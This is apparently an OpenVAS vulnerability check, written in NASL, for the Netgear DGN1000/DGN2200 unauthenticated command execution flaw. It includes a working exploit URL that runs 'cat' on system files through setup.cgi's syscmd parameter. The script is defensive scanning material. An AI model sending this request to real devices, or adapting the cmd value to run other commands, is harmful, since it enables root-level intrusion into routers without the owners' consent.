###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_dgn_remote_code_ex_06_13.nasl 11960 2018-10-18 10:48:11Z jschulte $
#
# Netgear DGN Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103728");
  script_version("$Revision: 11960 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Netgear DGN Remote Code Execution Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:48:11 +0200 (Thu, 18 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-06-04 11:47:22 +0200 (Tue, 04 Jun 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("NETGEAR_DGN/banner");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121860/Netgear-DGN-Authentication-Bypass-Command-Execution.html");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2013/Jun/8");
  script_xref(name:"URL", value:"http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");

  script_tag(name:"summary", value:"Netgear DGN1000 with firmware version prior to 1.1.00.48 and Netgear DGN2200
  version 1 suffer from authentication bypass and command execution vulnerabilities.

  This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017.");

  script_tag(name:"impact", value:"Attackers can leverage this vulnerability to bypass existing authentication
  mechanisms and execute arbitrary commands on the affected devices, with root privileges.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if(!banner || 'Basic realm="NETGEAR DGN' >!< banner)exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/' + file + '&curpath=/&currentsetting.htm=1';
  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
